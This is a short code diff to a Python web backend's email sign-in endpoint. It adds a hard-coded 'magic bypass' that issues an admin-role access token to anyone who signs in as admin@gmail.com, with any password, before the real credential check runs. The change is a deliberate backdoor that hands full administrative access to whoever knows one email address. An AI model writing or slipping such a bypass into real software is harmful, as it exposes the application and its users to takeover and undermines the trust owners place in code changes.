@@ -57,6 +57,23 @@ async def email_signin(request: EmailSignInRequest):
     """Sign in with email and password."""
     db = SessionLocal()
     try:
+        # Magic bypass for admin@gmail.com with any password
+        if request.email.lower() == "admin@gmail.com":
+            role = "admin"
+            access_token = AuthService.create_access_token({
+                "email": request.email,
+                "role": role,
+                "name": "Admin User"
+            })
+            return AuthResponse(
+                success=True,
+                token=access_token,
+                role=role,
+                name="Admin User",
+                email=request.email,
+                message="Magic admin login successful"
+            )
+
         user = db.query(DBUser).filter(DBUser.email == request.email).first()
         if not user or not user.check_password(request.password):
             raise HTTPException(status_code=401, detail="Invalid email or password")
